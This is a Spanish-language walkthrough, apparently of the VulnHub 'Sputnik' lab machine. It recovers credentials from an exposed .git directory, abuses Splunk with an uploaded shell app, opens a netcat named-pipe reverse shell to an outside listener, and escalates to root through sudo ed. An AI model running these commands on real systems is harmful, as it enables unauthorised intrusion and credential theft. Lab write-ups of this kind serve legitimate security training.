
---------
-  Tags:  #writeup #info #vulnhub #tutorial #github #splunk #git
----------
# Enumeracion
Encontramos 3 servicios *http*, en los puertos *8089*, *55555* y *61337*

En el *8089* no encontramos nada, parece no funcionar.
En el *61337* Tenmos un Panel de login, pero no disponemos de credenciales, ni es vulnerable a los diversos vectores de ataque.
En el *55555* podemos ver la aplicacion como tal sin mas. Pero si nos fijamos en el escaneo con [[Nmap]] podemos ver que se encuetra el directorio */.git*, ponemos atencion a los *Logs / HEAD* en este punto podemos hacer uso de herramientas como *Git-Dumper* para intentar pasarle esta *URL* y que nos intente mostrar una reconstruccion del codigo expuesto en git
- [Git-Dumper GITHUB](https://github.com/arthaud/git-dumper)

```bash
git-dumper http://192.168.3.179:55555/.git/  
```

Dentro vemos lo que parece ser el codigo fuente de la app principal, y tambien podemos ver los logs para ver los cambios que se le fueron realizando.
```
git log

git show f4385198ce1cab56e0b2a1c55e8863040045b085

git ls-tree 07fda135aae22fa7869b3de9e450ff7cacfbc717

```

Esto nos muestra un archivo secreto en un commit, el cual contiene las credenciales de usuario *sputnik*

---

- Ahora con estas credenciales nos podemos loguear en el recurso web del puerto *61337*, una vez dentro vemos un panel de  *SPLUNK*

# Explotacion SPLUNK
- con ayuda del [repositorio de github](https://github.com/TBGSecurity/splunk_shells) seguimos los pasos y creamos una  nueva app, elegimos la opcion de subir archivo. 
- Dentro del repositorio, en la seccion de [releases](https://github.com/TBGSecurity/splunk_shells/releases) tenemos que descargar el *source_code.tar.gz* para pasarselo como archivo a la app. Y reset
- Por ultimo es importante darle *Permisos all / global*
- Ahora nos vamos a la seccion de *SEARCH* del splunk, nos ponemos en escucha por un puerto y lanzamos ahi la [[Reverse Shell]]
```search
| revshell std 192.168.3.10 443
```

- Aqui ya ganamos acceso, pero la shell no nos deja hacer el tratamiento, por lo cual nos volvemos a poner en escucha y desde esa term, nos mandamos otra [[Reverse Shell]] con [[NetCat]]
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

--------

# PRIVESC

- Tenemos el usuario *Sputnik* en uso, recordemos que disponemos de una posible contraseña para este usuario, si la ingresamos para ver *Sudoers* con *sudo -l*, efectivamente es la contrasena del usuario.
- Vemos que el usuario puede ejecturar */bin/ed* como *root*, aqui simplemente iremos a [GTFOBINS](https://gtfobins.github.io/gtfobins/ed/#suid)
```bash
sudo ed
!/bin/sh
```

Y Pa Dentro!

